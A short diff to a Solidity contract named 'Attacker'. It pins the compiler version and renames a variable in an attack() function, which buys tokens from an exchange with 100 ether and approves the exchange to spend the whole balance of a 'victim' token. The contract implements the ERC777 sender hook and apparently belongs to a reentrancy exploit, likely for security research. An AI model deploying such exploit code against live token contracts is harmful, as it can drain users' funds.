@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.7.0;
+pragma solidity 0.7.0;
 
 import "node_modules/openzeppelin-solidity-3.4.0/introspection/IERC1820Registry.sol";
 import "node_modules/openzeppelin-solidity-3.4.0/introspection/ERC1820Implementer.sol";
@@ -41,8 +41,8 @@ contract Attacker is IERC777Sender, ERC1820Implementer {
     }
 
     function attack() external {
-      uint256 input_value = exchange.ethToTokenInput{value: 100 ether}();
-      require(input_value != 0, "input_value error");
+      uint256 inputValue = exchange.ethToTokenInput{value: 100 ether}();
+      require(inputValue != 0, "Input value error");
       bool ret = victim.approve(address(exchange), victim.balanceOf(address(this)));
       require(ret == true, "approve failed");
       
